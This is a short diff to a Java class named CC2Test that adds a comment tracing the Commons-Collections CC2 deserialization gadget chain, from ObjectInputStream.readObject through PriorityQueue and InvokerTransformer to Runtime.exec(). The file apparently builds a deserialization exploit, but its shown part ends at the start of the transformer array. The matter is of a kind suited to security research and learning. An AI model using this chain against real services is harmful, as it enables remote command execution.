@@ -14,6 +14,21 @@ import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
 import java.util.PriorityQueue;
 
+/**
+ *Gadget chain:
+ * 		ObjectInputStream.readObject()
+ * 			PriorityQueue.readObject()
+ * 			    PriorityQueue.heapify()
+ * 			        PriorityQueue.siftDown()
+ * 			            PriorityQueue.siftDownUsingComparator()
+ * 					        TransformingComparator.compare()
+ * 					            ChainedTransformer.transform()
+ * 								    ConstantTransformer.transform()
+ * 								    InvokerTransformer.transform()
+ * 					        		    Method.invoke()
+ * 					        			    Runtime.exec()
+ **/
+
 public class CC2Test {
     public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
         Transformer[] fakeTransformers = new Transformer[]{
